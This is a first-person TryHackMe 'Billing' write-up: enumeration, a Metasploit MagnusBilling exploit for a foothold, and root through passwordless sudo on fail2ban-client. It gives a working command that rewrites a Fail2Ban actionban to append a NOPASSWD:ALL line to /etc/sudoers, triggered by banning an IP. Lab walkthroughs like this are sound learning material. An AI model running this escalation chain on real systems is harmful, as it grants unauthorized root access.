# TryHackMe: Billing – Write Up

> Room: **Billing** (TryHackMe)  
> Author: Aziii (@mahad5063)  
> Note: I am still learning and did this on my own, with a bit of help from ChatGPT in the later sections.

---

## 1. Enumeration

### 1.1 Nmap Scan

First, I started with an `nmap` scan on the target to discover open ports and services:

```bash
nmap -sC -sV -oN scan.txt <TARGET_IP>
````

From the scan, I saw several open ports. At first I was a bit clueless about what to focus on, until I noticed something interesting on HTTP related to **MagnusBilling**.

---

### 1.2 Checking the Website

Next, I visited the website in the browser:

```text
http://<TARGET_IP>/
```

At first glance, there was nothing very interesting or obviously vulnerable on the main page.

---

### 1.3 Directory Brute-Forcing

I then ran a directory brute-force with `gobuster` to look for hidden paths:

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt
```

Nothing special came up from that scan.

---

### 1.4 Focusing on MagnusBilling

Since there were no big findings from the web root itself or gobuster, the last promising lead was the MagnusBilling-related part I saw from enumeration.

So I decided to focus on **MagnusBilling**.

---

## 2. Getting a Foothold (MagnusBilling Exploit)

### 2.1 Searching Exploits in Metasploit

I opened `msfconsole` and searched for MagnusBilling-related modules:

```bash
msfconsole
search magnus
```

I found an interesting MagnusBilling exploit module and decided to try it.

### 2.2 Using the Exploit

I selected the module (e.g. by using option `0` in Metasploit) and set the required options:

```bash
use <exploit_module_path>
set RHOSTS <TARGET_IP>
set RPORT <PORT_IF_NEEDED>
run
```

The exploit worked, and I got a shell on the target machine.

---

## 3. User Flag

Once I had a shell, I started basic enumeration.

### 3.1 Listing Home Directories

```bash
ls -la /home
```

I found a folder named:

```text
/home/magnus
```

### 3.2 Getting the User Flag

I moved into that directory:

```bash
cd /home/magnus
ls
```

Inside, I found `user.txt` and read it to get the **user flag**.

I was really happy at this point 😄 — it felt very good because this was my first proper foothold and user flag on my own.

---

## 4. Privilege Escalation

Now, the last task was to get **root**.

### 4.1 Checking Sudo Permissions

The first thing I did was:

```bash
sudo -l
```

This showed something very interesting:

```text
(ALL) NOPASSWD: /usr/bin/fail2ban-client
```

This was a **huge clue**.

It means the current user can run `fail2ban-client` as root **without a password**.

### 4.2 Understanding Fail2Ban (with Help from ChatGPT)

I didn’t know what `fail2ban` was at first, so I asked ChatGPT and did some research.

In short:

* Fail2Ban watches logs for suspicious activity (e.g., failed logins).
* When a rule is triggered, it can **ban an IP** and run certain **actions** (like iptables rules) as root.
* These actions are configurable (for example, `actionban`).

This means we might be able to abuse Fail2Ban’s **actions** to run arbitrary commands as root.

---

## 5. Exploiting Fail2Ban for Root

### 5.1 Modifying the Fail2Ban Action

With guidance and experimentation, I ended up using this exploit chain:

```bash
sudo fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban "sh -c 'echo \"asterisk ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers'"
```

What this does:

* Edits the Fail2Ban jail `asterisk-iptables`.
* Sets its `actionban` command to run:

  ```bash
  sh -c 'echo "asterisk ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers'
  ```
* This appends a line to `/etc/sudoers` making the user `asterisk` able to run **all commands with sudo, without a password**.

Then I triggered the jail by banning my own **local/VPN IP**:

```bash
sudo fail2ban-client set asterisk-iptables banip <YOUR_LOCAL_IP>
```

This caused Fail2Ban to execute `actionban` as root and update `/etc/sudoers`.

---

## 6. Getting Root Shell

After that, I first tried:

```bash
sudo su -
```

But it still asked for a password, which confused me because I had added `NOPASSWD:ALL`. So I tried something different.

Instead of `su`, I used non-interactive sudo directly:

```bash
sudo -n /bin/bash
```

Now when I checked:

```bash
whoami
```

It returned:

```text
root
```

That confirmed I had a **root shell**.

---

## 7. Root Flag

From the root shell:

```bash
cd /root
ls
```

I found `root.txt` there. After reading it:

```bash
cat root.txt
```

I obtained the **root flag** and completed the room. 🎉

---

## 8. Final Notes

This was my **first writeup** and also the first room where I did most of the work on my own, with some help from ChatGPT in the privilege escalation section.

Things I learned:

* Always run `sudo -l` when you get a shell.
* Don’t ignore “weird” services like `fail2ban`.
* Even if you don’t know a tool, you can learn it on the fly and still exploit it.
* It’s okay to use help (ChatGPT, blogs, etc.) as long as you **understand what you’re doing** and can explain it.

I know this isn’t a perfect or very advanced writeup, but it’s a start — and I’ll keep improving.

**Best of luck to everyone!** 🚀
